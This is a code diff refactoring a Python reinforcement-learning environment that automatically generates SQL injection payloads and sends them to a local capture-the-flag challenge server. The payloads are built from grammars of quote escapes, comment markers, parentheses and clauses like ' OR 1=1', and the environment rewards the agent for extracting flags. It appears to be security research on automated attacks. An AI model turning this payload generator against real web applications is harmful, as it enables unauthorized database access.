@@ -1,325 +1,251 @@
 import logging
 import os
 import re
-import time
 
 import gymnasium as gym
 import numpy as np
 import requests
 from dotenv import load_dotenv
 from gymnasium import spaces
-from nltk import CFG
 from nltk.parse.generate import generate
-from numpy._typing import ArrayLike
-from requests import Response
-from requests.adapters import HTTPAdapter
+from numpy.typing import ArrayLike
 from stable_baselines3.common.monitor import Monitor
-from urllib3 import Retry
+
+from cfg import cfg_phase1, cfg_phase2, cfg_phase3
+from utils import (
+    setup_session, generate_atomic_clause)
 
 # Load environment variables from .env file
 load_dotenv()
 
-NUM_CHALLENGES = int(os.getenv('NUM_CHALLENGES', 1))  # Default to 1 if not set
+NUM_CHALLENGES = int(os.getenv("NUM_CHALLENGES", 1))  # Default to 1 if not set
 
-# Define CFG for identifying valid escape characters
-sql_grammar_phase1 = """
-S -> ESC COMMENT
-ESC -> "'" | '"'
-COMMENT -> "-- " | "# " | "/* "
-"""
+# Configure logging for detailed tracking
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Define CFG for identifying valid parentheses structure
-sql_grammar_phase2 = """
-S -> ESC_COMMENT | CLOSE_PAREN COMMENT
-ESC_COMMENT -> COMMENT
-CLOSE_PAREN -> ")" | "))" | ")))" | "))))" | ")))))"
-COMMENT -> "-- " | "# " | "/* "
-"""
-
-# Define CFG for injecting SQL statements using identified parentheses structure
-sql_grammar_phase3 = """
-S -> CLAUSE
-CLAUSE -> SIMPLE_CLAUSE | SIMPLE_CLAUSE OPERATION
-SIMPLE_CLAUSE -> " OR 1=1" | " AND 1=1" | " OR 'a'='a'" | " AND 'a'='a'"
-OPERATION -> " LIMIT 1 OFFSET " NUMBER | " ORDER BY " COLUMN
-NUMBER -> "0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9"
-COLUMN -> "1" | "2" | "3" | "4" | "5"
-"""
-
-cfg_phase1 = CFG.fromstring(sql_grammar_phase1)
-cfg_phase2 = CFG.fromstring(sql_grammar_phase2)
-cfg_phase3 = CFG.fromstring(sql_grammar_phase3)
+cfg_phase3_rules = [
+    (rule.lhs, rule.rhs)
+    for rule in cfg_phase3.productions()  # Extract rules from the grammar object
+]
 
 
 class SQLiEnv(gym.Env):
     """
-    Custom environment for SQL injection attacks using reinforcement learning.
-    """
+   Custom environment for SQL injection attacks using reinforcement learning.
+
+   SQLiEnv class simulates a SQL injection attack, where an RL agent generates payloads
+   in phases. It iteratively learns by interacting with server responses, aiming to find
+   a flag through progressive injection stages.
+   """
 
     def __init__(self):
-        super(SQLiEnv, self).__init__()
+        """Initialize the SQLiEnv environment, action, and observation spaces."""
+        super().__init__()
+        self.current_challenge_id = None
+        self.last_payload = None
         self.base_url = "http://localhost:5959/challenge/"
-        self.current_challenge_id = 1
-        self.last_payload = ""  # Store the last payload
-        self.exploit_char_found = False  # Flag for finding exploit character
-        self.exploit_char = ""  # Store the found exploit character
-        self.valid_structure = False  # Flag to indicate if the valid structure is found
-        self.found_parenthesis_structure = False  # Flag for finding the parenthesis structure
-        self.parentheses_structure = ""  # Store the valid parenthesis structure
-        self.step_count = 0  # Track the number of steps in the current episode
-        self.max_steps_per_episode = 5000  # Maximum steps per episode
+        self.session = setup_session()
+        self._initialize_flags()
 
         # Define the action and observation spaces
-        self.action_space = spaces.Box(low=0, high=1, shape=(10,), dtype=np.float32)
-        self.observation_space = spaces.Box(low=0, high=1, shape=(3,), dtype=np.float32)
+        self.action_space = spaces.Box(
+            low=0, high=1, shape=(3,), dtype=np.float32
+        )
+        self.observation_space = spaces.Box(
+            low=0, high=1, shape=(3,), dtype=np.float32
+        )
         # Observation space: [query_valid, data_found, flag_found]
-
-        # Set up a session with retries
-        self.session = requests.Session()
-        retries = Retry(total=5, backoff_factor=0.1)
-        self.session.mount("http://", HTTPAdapter(max_retries=retries))
 
         # Pre-generate sequences
         self.phase1_sequences = list(generate(cfg_phase1, n=10))
         self.phase2_sequences = list(generate(cfg_phase2, n=10))
         self.phase3_sequences = list(generate(cfg_phase3, n=10))
 
-    def generate_payload(self, phase: int, action: ArrayLike) -> str:
-        """
-        Generate the SQL injection payload based on the current phase and action.
-
-        :param phase: The current phase of the environment.
-        :param action: The action taken by the agent.
-        :return: The generated SQL injection payload.
-        """
-        action = np.clip(action, 0, 1)  # Clip the action values to [0, 1]
-
-        if phase == 1:
-            # Phase 1: Finding the escape character and comment type
-            grammar = self.phase1_sequences
-            action_index = int(action[0] * (len(grammar) - 1))
-            payload = ' '.join(grammar[action_index])
-
-        elif phase == 2:
-            # Phase 2: Finding the valid parentheses structure
-            grammar = self.phase2_sequences
-            action_index = int(action[0] * (len(grammar) - 1))
-            parenthesis_payload = ' '.join(grammar[action_index])
-            if "ESC_COMMENT" in parenthesis_payload:
-                payload = f"{self.exploit_char} {parenthesis_payload.split()[1]}"
-            else:
-                payload = f"{self.exploit_char} {parenthesis_payload}"
-
-        else:
-            # Phase 3: Crafting the full SQL injection payload
-            grammar = self.phase3_sequences
-            action_index = int(action[0] * (len(grammar) - 1))
-            clause = ' '.join(grammar[action_index])
-
-            # Extract parentheses and comment part from the stored parentheses_structure
-            match = re.search(r"(\)+)\s*(--|#|/\*)", self.parentheses_structure)
-            if match:
-                parentheses = match.group(1)
-                comment = match.group(2).strip() + " "  # Ensure a space after the comment character
-                num_parentheses = len(parentheses)
-                parts = clause.split()
-
-                # Identify CFG tokens by parsing the grammar
-                cfg_tokens = self.extract_tokens_from_grammar(cfg_phase3)
-
-                # Determine valid insertion points for parentheses, avoiding CFG tokens
-                valid_insertion_points = self.get_valid_insertion_points(parts, cfg_tokens)
-
-                if not valid_insertion_points:
-                    valid_insertion_points = [0]
-
-                group_parentheses = action[1] > 0.5
-                if group_parentheses:
-                    split_index = int(action[2] * len(valid_insertion_points))  # Choose a split index based on action
-                    if split_index < len(valid_insertion_points):
-                        parts.insert(valid_insertion_points[split_index],
-                                     parentheses)  # Insert all parentheses at the chosen index
-                else:
-                    # Distribute parentheses based on action indices
-                    split_indices = sorted(
-                        [int(action[i + 2] * len(valid_insertion_points)) for i in range(num_parentheses)]
-                    )
-                    for i, index in enumerate(split_indices):
-                        if index < len(valid_insertion_points):
-                            parts.insert(valid_insertion_points[index] + i, ')')
-
-                clause_with_parentheses = ' '.join(parts)
-                payload = f"{self.exploit_char} {clause_with_parentheses}".strip()
-            else:
-                # No valid parentheses structure found, generate payload without escape character before comment
-                payload = f"{self.exploit_char} {clause}".strip()
-                # remove the exploit char in the parentheses structure
-                comment = self.parentheses_structure.replace(self.exploit_char, "")
-
-            payload = f"{payload} {comment}"
-
-        return payload
-
-    def extract_tokens_from_grammar(self, grammar):
-        """
-        Extract all tokens from the given CFG grammar.
-
-        :param grammar: The CFG grammar to extract tokens from.
-        :return: A set of CFG tokens.
-        """
-        tokens = set()
-        for production in grammar.productions():
-            rhs = production.rhs()
-            for symbol in rhs:
-                if isinstance(symbol, str):
-                    tokens.add(symbol)
-        return tokens
-
-    def get_valid_insertion_points(self, parts, tokens):
-        """
-        Get valid insertion points for parentheses, avoiding splitting CFG tokens.
-
-        :param parts: The list of parts of the clause.
-        :param tokens: The set of CFG tokens to avoid splitting.
-        :return: A list of valid insertion points.
-        """
-        valid_insertion_points = []
-        for i in range(len(parts) + 1):
-            if i < len(parts):
-                if parts[i] in tokens:
-                    continue
-            if i > 0:
-                if parts[i - 1] in tokens:
-                    continue
-            valid_insertion_points.append(i)
-        return valid_insertion_points
-
-    def step(self, action: ArrayLike) -> (ArrayLike, float, bool, bool, dict):
-        """
-        Execute one step in the environment.
-
-        :param action: The action taken by the agent.
-        :return: A tuple containing the new state, reward, done flag, truncated flag, and info dictionary.
-        """
-        self.step_count += 1  # Increment step count
-
-        # Phase 1: Find the escape character
-        if not self.exploit_char_found:
-            payload = self.generate_payload(phase=1, action=action)
-        # Phase 2: Find the valid number of closing parentheses
-        elif not self.found_parenthesis_structure:
-            payload = self.generate_payload(phase=2, action=action)
-        # Phase 3: Generate SQL injection payloads with identified structure
-        else:
-            payload = self.generate_payload(phase=3, action=action)
-
-        self.last_payload = payload
-        start_time = 0
-        end_time = 0
-        data = {}
-        try:
-            response_get = self.session.get(f"{self.base_url}{self.current_challenge_id}", timeout=30)
-            if "Login" in response_get.text:
-                data = {"username_payload": payload, "password_payload": ""}
-            elif "Filter" in response_get.text:
-                data = {"payload": payload}
-
-            start_time = time.time()
-            response = self.session.post(f"{self.base_url}{self.current_challenge_id}", data=data, timeout=30)
-            end_time = time.time()
-
-            state, reward, done = self.analyze_response(response.text, payload, response.status_code,
-                                                        response_get)
-        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
-            logging.error(f"Connection failed: {e}")
-            state, reward, done, truncated = np.zeros(self.observation_space.shape), -1000, False, False
-
-        # Check if episode should be truncated due to reaching the max steps
-        if self.step_count >= self.max_steps_per_episode:
-            truncated = True
-        else:
-            truncated = False
-
-        info = {"response_time": end_time - start_time}
-
-        return np.array(state), reward, done, truncated, info
-
-    def reset(self, **kwargs) -> (ArrayLike, dict):
-        """
-        Reset the environment for a new episode.
-
-        :return: A tuple containing the initial state and an empty dictionary.
-        """
-        print(f"RESET flag found or max steps reached")
+    def _initialize_flags(self):
+        """Initialize tracking flags for the environment's state."""
+        self.current_challenge_id = 1
+        self.last_payload = ""
         self.exploit_char_found = False
         self.found_parenthesis_structure = False
-        self.valid_structure = False
         self.exploit_char = ""
         self.parentheses_structure = ""
-        self.step_count = 0  # Reset step count for new episode
-        if NUM_CHALLENGES > 1:
-            self.current_challenge_id = (self.current_challenge_id % NUM_CHALLENGES) + 1
-        self.session.get("http://localhost:5959/reset")
-        initial_observation = np.zeros(self.observation_space.shape)  # Initialize the state properly
-        return initial_observation, {}
+        self.comment_char = ""
+        self.step_count = 0
+        self.max_steps_per_episode = 5000
 
-    def analyze_response(self, response_text: str, payload: str, response_status: int, response_get: Response) -> (
-            ArrayLike, float, bool, bool):
+    def _generate_payload(self, phase: int, action: ArrayLike) -> str:
         """
-        Analyze the response from the server to determine the new state and reward.
+         Generate the SQL injection payload based on the current phase and action.
 
-        :param response_text: The response text from the server.
+         :param phase: The current phase of the environment.
+         :param action: ArrayLike, the action taken by the agent.
+         :return: The generated SQL injection payload as a string.
+         """
+        action = np.clip(action, 0, 1)  # Clip the action values to [0, 1]
+        grammar = {
+            1: self.phase1_sequences,
+            2: self.phase2_sequences,
+            3: self.phase3_sequences,
+        }[phase]
+        action_index = int(action[0] * (len(grammar) - 1))
+
+        payload = self._build_payload(phase, grammar[action_index], action)
+        logging.debug(f"Generated payload for phase {phase}: {payload}")
+        return payload
+
+    def _build_payload(self, phase: int, selected_clause: str, action: ArrayLike) -> str:
+        """
+        Simplify payload construction based on phase and chosen grammar clause.
+
+        :param phase: Integer representing the current phase of the environment.
+        :param selected_clause: The clause generated from the CFG grammar.
+        :param action: ArrayLike, the action vector influencing payload structure.
+        :return: A string representing the generated payload.
+        """
+        if phase == 1:
+            return " ".join(selected_clause)
+        elif phase == 2:
+            return f"{self.exploit_char} {' '.join(selected_clause)}"
+        else:
+            # Build complex payload for phase 3
+            return self._build_complex_payload(action)
+
+    def _build_complex_payload(self, action: ArrayLike) -> str:
+        """
+        Build the payload for phase 3, ensuring parentheses do not break atomic CFG units.
+
+        :param action: ArrayLike, action vector influencing payload structure.
+        :return: Fully constructed SQL injection payload.
+        """
+        # Generate atomic clauses from CFG
+        generated_clauses = generate_atomic_clause(cfg_phase3, n=100)  # Generate array of 100 atomic clauses
+
+        # Select a generated clause based on the action
+        action_index = int(action[0] * (len(generated_clauses) - 1))
+
+        selected_clause_units = generated_clauses[action_index]  # Select 1 atomic clause
+
+        # Map actions to parentheses placement
+        parentheses_actions = action[1:]  # Use remaining actions for parentheses placement
+        num_parentheses = len(self.parentheses_structure)
+        insertion_indices = sorted(
+            [round(a * (len(selected_clause_units))) for a in parentheses_actions[:num_parentheses]]
+        )
+
+        # Insert parentheses into the clause
+        clause_with_parentheses = []
+        last_index = 0
+        for idx in insertion_indices:
+            clause_with_parentheses.extend(selected_clause_units[last_index:idx])
+            clause_with_parentheses.append(")")  # Insert parenthesis at the specified index
+            last_index = idx
+
+        clause_with_parentheses.extend(selected_clause_units[last_index:])
+
+        # Combine the clause with the escape character and comment
+        selected_clause = " ".join(clause_with_parentheses)
+        payload = f"{self.exploit_char} {selected_clause}" if self.exploit_char else selected_clause
+        payload_with_comment = f"{payload} {self.comment_char}"
+        return payload_with_comment
+
+    def step(self, action: ArrayLike) -> tuple[np.ndarray, float, bool, bool, dict]:
+        """
+       Execute a step in the environment using the given action and process the response.
+
+       :param action: ArrayLike, the action taken by the agent.
+       :return: Tuple containing the current state (np.ndarray), reward (float),
+                done (bool), truncated (bool), and additional info (dict).
+       """
+        self.step_count += 1
+        # Ensure the agent goes through phases sequentially
+        phase = (
+            1 if not self.exploit_char_found else (2 if not self.found_parenthesis_structure else 3)
+        )
+        payload = self._generate_payload(phase, action)
+        response = self._send_request(payload)
+        self.last_payload = payload
+        return self._process_response(response, payload)
+
+    def _send_request(self, payload: str) -> tuple[requests.Response | None, requests.Response | None]:
+        """
+        Send the generated payload to the server and handle any connection errors.
+
+        :param payload: The SQL injection payload string to be sent to the server.
+        :return: Tuple containing the POST and GET requests' responses (or None if request failed).
+        """
+        try:
+            response_get = self.session.get(f"{self.base_url}{self.current_challenge_id}", timeout=30)
+            data = {"username_payload": payload, "password_payload": ""} if "Login" in response_get.text else {
+                "payload": payload}
+            response = self.session.post(f"{self.base_url}{self.current_challenge_id}", data=data, timeout=30)
+            return response, response_get
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Connection failed: {e}")
+            return None, None
+
+    def _process_response(self, response: tuple[requests.Response | None, requests.Response | None], payload: str) \
+            -> tuple[np.ndarray, float, bool, bool, dict]:
+        """
+         Process the server's response to determine the current state, reward, and completion status.
+
+         :param response: Tuple containing the server's GET and POST responses.
+         :param payload: The SQL injection payload string that was sent.
+         :return: Tuple containing the state (np.ndarray), reward (float), done (bool),
+                  truncated (bool), and additional info (dict).
+         """
+        if response:
+            state, reward, done = self._analyze_response(response[0], payload)
+            truncated = self.step_count >= self.max_steps_per_episode
+            return np.array(state), reward, done, truncated, {"response_time": response[0].elapsed.total_seconds()}
+        return np.zeros(self.observation_space.shape), -1000, False, False, {}
+
+    def _analyze_response(
+            self, response: requests.Response, payload: str
+    ) -> tuple[list[int], int, bool]:
+        """
+        Analyze the server's response to update environment state and determine reward.
+
+        :param response: The server's response object.
         :param payload: The payload sent to the server.
-        :param response_status: The HTTP status code of the response.
-        :param response_get: The initial GET response.
-        :return: A tuple containing the new state, reward, done flag.
+        :return: A tuple containing the state (list of observation flags), reward, and completion status.
         """
-        state, reward = self.set_flags(payload, response_text, response_status, response_get)
+        state, reward = self._set_flags(payload, response.text, response.status_code)
         done = all(state)
         return state, reward, done
 
-    def set_flags(self, payload: str, response_text: str, response_status: int, response_get: Response) -> (
-            ArrayLike, float):
+    def _set_flags(self, payload: str, response_text: str, response_status: int) -> tuple[list[int], int]:
         """
-        Set the flags for the current state based on the response from the server.
+        Update state flags based on server response status and content.
 
         :param payload: The payload sent to the server.
-        :param response_text: The response text from the server.
+        :param response_text: The text content of the server's response.
         :param response_status: The HTTP status code of the response.
-        :param response_get: The initial GET response.
-        :return: A tuple containing the new state and reward.
+        :return: Tuple containing the state as a list of integers and reward as an integer.
         """
-        flag_pattern = rf"flag_challenge_{self.current_challenge_id}\{{[^}}]+}}"
-        space = [0, 0, 0]
-        # Observation space: [query_valid, data_found, flag_found]
-
+        state = [0, 0, 0]
         if response_status == 200:
-            space[0] = 1  # Query is valid
-            if not self.found_parenthesis_structure and self.exploit_char_found:
+            state[0] = 1
+            if self.exploit_char_found and not self.found_parenthesis_structure:
                 self.found_parenthesis_structure = True
-                self.parentheses_structure = payload  # Store the valid parenthesis structure
-                print(f"Valid parenthesis structure found: {self.parentheses_structure}")
+                self.parentheses_structure = ''.join(re.findall(r'[)]+', payload))
+                self.comment_char = f"{payload.split()[-1]} "  # Ensure adding whitespace after comment character
+                logging.info(f"Phase 2 success - Parentheses structure found: {self.parentheses_structure or 
+                                                                               'Without parentheses'}")
+        if response_status == 200 and ("fail" or "wrong") not in response_text.lower():
+            state[1] = 1
+        if re.search(rf"flag_challenge_{self.current_challenge_id}\{{[^}}]+}}", response_text):
+            state[1], state[2] = 1, 1
+            logging.info(f"Flag found in payload: {payload}")
+        reward = self._calculate_reward(state, payload)
+        return state, reward
 
-        # Successful bypass of the password check
-        if (response_status == 200 and ("wrong" or "fail") not in response_text.lower()
-                and len(response_text) != len(response_get.text)):
-            space[1] = 1  # Data found
-
-        if re.search(flag_pattern, response_text):
-            space[1] = 1  # Data found
-            space[2] = 1  # Flag found
-            print(f"Flag found: {re.search(flag_pattern, response_text).group()}")
-
-        reward = self.set_reward(space, payload)
-        return space, reward
-
-    def set_reward(self, space: list[int], payload: str) -> int:
+    def _calculate_reward(self, space: list[int], payload: str) -> int:
         """
         Set the reward for the current state based on the response from the server.
 
-        :param space: The current observation space.
+        :param space: The current observation space as a list of integers.
         :param payload: The payload sent to the server.
-        :return: The reward for the current state.
+        :return: The calculated reward as an integer.
         """
         reward = 0
 
@@ -345,6 +271,20 @@ class SQLiEnv(gym.Env):
             reward = -1  # High reward for finding the flag
 
         return reward
+
+    def reset(self, **kwargs) -> tuple[np.ndarray, dict]:
+        """
+        Reset the environment to its initial state, advancing to the next challenge if available.
+
+        :param kwargs: Additional keyword arguments for compatibility with gym reset().
+        :return: Tuple containing the reset observation state (np.ndarray) and additional info (dict).
+        """
+        self._initialize_flags()
+        if NUM_CHALLENGES > 1:
+            self.current_challenge_id = (self.current_challenge_id % NUM_CHALLENGES) + 1
+        self.session.get("http://localhost:5959/reset")
+        logging.info("Environment reset")
+        return np.zeros(self.observation_space.shape), {}
 
 
 env = Monitor(SQLiEnv(), "logs", allow_early_resets=True)
